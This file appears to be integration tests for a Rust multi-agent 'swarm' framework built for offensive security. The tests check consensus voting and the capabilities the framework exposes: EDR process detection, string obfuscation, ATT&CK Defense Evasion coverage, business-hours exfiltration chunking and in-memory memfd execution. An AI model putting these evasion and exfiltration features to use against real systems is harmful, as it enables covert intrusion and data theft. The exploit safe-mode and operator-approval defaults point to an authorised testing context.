// Integration test: deploys the full swarm and validates end-to-end behavior.

use std::time::Duration;
use std::net::TcpStream;

/// Test 1: Swarm agents don't open TCP ports (operator ports 8080/8443 excluded).
#[test]
fn test_swarm_no_tcp_ports() {
    let ports = [4242, 1337, 31337, 4444, 5555];
    for &port in &ports {
        assert!(
            TcpStream::connect_timeout(
                &format!("127.0.0.1:{}", port).parse().unwrap(),
                Duration::from_millis(300),
            ).is_err(),
            "Port {} is OPEN — swarm should not have TCP listeners", port
        );
    }
}

/// Test 2: Arena name generation produces unique values.
#[test]
fn test_arena_name_unique() {
    let name1 = hive_base::shared_arena::generate_arena_name();
    let name2 = hive_base::shared_arena::generate_arena_name();
    assert_ne!(name1, name2, "Arena names must be unique");
    assert!(name1.starts_with("/swarm_"), "Arena name must start with /swarm_");
}

/// Test 3: Consensus engine reaches correct decisions.
#[test]
fn test_consensus_reaches_threshold() {
    use hive_base::{ConsensusEngine, Decision};
    use uuid::Uuid;

    let mut engine = ConsensusEngine::new(0.66);
    let agent_a = Uuid::new_v4();
    let agent_b = Uuid::new_v4();
    let agent_c = Uuid::new_v4();
    let proposal = Uuid::new_v4();

    engine.register_proposal(proposal, "test".into(), "arg".into(), agent_a, 1000);
    engine.cast_vote(proposal, agent_a, Decision::Support, 1.0);
    engine.cast_vote(proposal, agent_b, Decision::Support, 1.0);
    engine.cast_vote(proposal, agent_c, Decision::Reject, 1.0);

    let (reached, ratio, _) = engine.check_consensus(&proposal).unwrap();
    assert!(reached, "2/3 support should reach 0.66 threshold");
    assert!(ratio > 0.65, "Ratio should be ~0.67");
}

/// Test 4: Reputation affects voting weight.
#[test]
fn test_reputation_affects_weight() {
    use hive_base::{ConsensusEngine, Decision};
    use uuid::Uuid;

    let mut engine = ConsensusEngine::new(0.66);
    let good_agent = Uuid::new_v4();
    let bad_agent = Uuid::new_v4();
    let proposal = Uuid::new_v4();

    // Good agent gets rewarded
    engine.adjust_reputation(good_agent, true, 0.5, 0.0);
    // Bad agent gets penalized
    engine.adjust_reputation(bad_agent, false, 0.0, 0.5);

    engine.register_proposal(proposal, "test".into(), "arg".into(), good_agent, 1000);
    engine.cast_vote(proposal, good_agent, Decision::Support, 1.0);
    engine.cast_vote(proposal, bad_agent, Decision::Reject, 1.0);

    // Good agent's vote should have more weight
    let (reached, ratio, total_weight) = engine.check_consensus(&proposal).unwrap();
    assert!(reached, "Good agent weighted vote should dominate");
    assert!(total_weight >= 2.0, "Weight should be at least base sum");
    assert!(ratio > 0.5, "Ratio should favor good agent");
}

/// Test 5: Crypto roundtrip (model encrypt/decrypt).
#[test]
fn test_crypto_roundtrip() {
    let seed = b"integration_test_seed_12345";
    let plaintext = vec![0xAAu8; 1024]; // simulated ONNX model

    // Build-time encryption simulation
    let nonce: Vec<u8> = (0..16).map(|_| rand::random()).collect();
    let mut encrypted = Vec::new();
    encrypted.extend_from_slice(&nonce);
    for (i, &b) in plaintext.iter().enumerate() {
        let ks = keystream_byte(seed, &nonce, i);
        encrypted.push(b ^ ks);
    }

    // Runtime decryption
    let decrypted = hive_base::decrypt_model(&encrypted, seed).unwrap();
    assert_eq!(plaintext, decrypted);
}

fn keystream_byte(seed: &[u8], nonce: &[u8], pos: usize) -> u8 {
    let mut h: u32 = 0x9e3779b9;
    for &b in seed { h = h.wrapping_mul(31).wrapping_add(b as u32); }
    for &b in nonce { h = h.wrapping_mul(31).wrapping_add(b as u32); }
    h = h.wrapping_mul(31).wrapping_add(pos as u32);
    h = h.wrapping_mul(31).wrapping_add(pos.wrapping_mul(0x517cc1b7) as u32);
    ((h >> 16) ^ h) as u8
}

/// Test 6: Load default config.
#[test]
fn test_config_default_loads() {
    let cfg = hive_base::config::HiveConfig::default();
    assert!(cfg.agents.edr_processes.contains(&"csfalcon".to_string()));
    assert_eq!(cfg.consensus.threshold, 0.66);
    assert!(cfg.exploits.safe_mode, "Exploits must default to safe mode");
    assert!(!cfg.exploits.operator_approved, "Exploits must require operator approval");
}

/// Test 7: Obfuscate string at compile time.
#[test]
fn test_obfuscate_string() {
    let s: String = hive_base::obf!("127.0.0.1:4242");
    assert!(s.contains("127.0.0.1"));
    assert!(s.contains("4242"));
}

/// Test 8: ATT&CK coverage report generates.
#[test]
fn test_attack_coverage_report() {
    let report = hive_base::generate_coverage_report();
    assert!(report.contains("ATT&CK"));
    assert!(report.contains("Defense Evasion"));
    assert!(report.contains("T1055.012"));
}

/// Test 9: Exfil scheduler respects business hours.
#[test]
fn test_exfil_scheduler_default() {
    let s = hive_base::ExfilScheduler::default();
    assert_eq!(s.min_chunk_size, 256);
    assert_eq!(s.max_chunk_size, 8192);
    let data = vec![0u8; 10000];
    let chunks = s.schedule(&data);
    assert!(!chunks.is_empty(), "Schedule should fragment data");
    let total: usize = chunks.iter().map(|(c, _)| c.len()).sum();
    assert_eq!(total, 10000);
}

/// Test 10: MemfdBinary creation on Linux.
#[cfg(target_os = "linux")]
#[test]
fn test_memfd_creation() {
    let data = b"#!/bin/sh\necho test\n";
    let memfd = hive_base::MemfdBinary::new("test_memfd", data);
    assert!(memfd.is_ok(), "memfd_create should succeed on Linux");
    let memfd = memfd.unwrap();
    assert!(memfd.raw_fd() > 0, "memfd should have valid fd");
}
